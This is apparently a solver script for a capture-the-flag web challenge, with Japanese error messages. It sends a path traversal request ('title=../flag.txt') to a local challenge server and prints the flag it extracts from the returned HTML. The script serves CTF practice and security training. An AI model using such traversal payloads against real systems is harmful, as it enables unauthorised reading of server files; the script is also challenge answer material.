import sys

import requests

from bs4 import BeautifulSoup


ERROR_PREFIX = "エラー: "


def solve(port: int):
    url = f"http://localhost:{port}/articles?title=../flag.txt"
    try:
        html = requests.get(url).text
    except requests.exceptions.ConnectionError:
        print(f"{ERROR_PREFIX}'{url}' で接続が拒否されました。対象ポート番号は正しいかどうか、問題サーバが起動しているかどうか確認してください。")
        sys.exit()
    soup = BeautifulSoup(html, "html.parser")
    flag = soup.find("div").string
    print(flag)


if __name__ == "__main__":
    try:
        port = int(sys.argv[1])
    except IndexError:
        print(f"{ERROR_PREFIX}引数に対象ポート番号を指定してください。")
        print(f"対象ポート番号5000を指定する場合の例:\n\tpython3 solver.py 5000")
        sys.exit()
    except ValueError:
        print(f"{ERROR_PREFIX}対象ポート番号は整数で指定してください。")
        sys.exit()
    if "." in str(port):
        print(f"{ERROR_PREFIX}対象ポート番号は小数ではなく整数で指定してください。")
        sys.exit()
    solve(port)

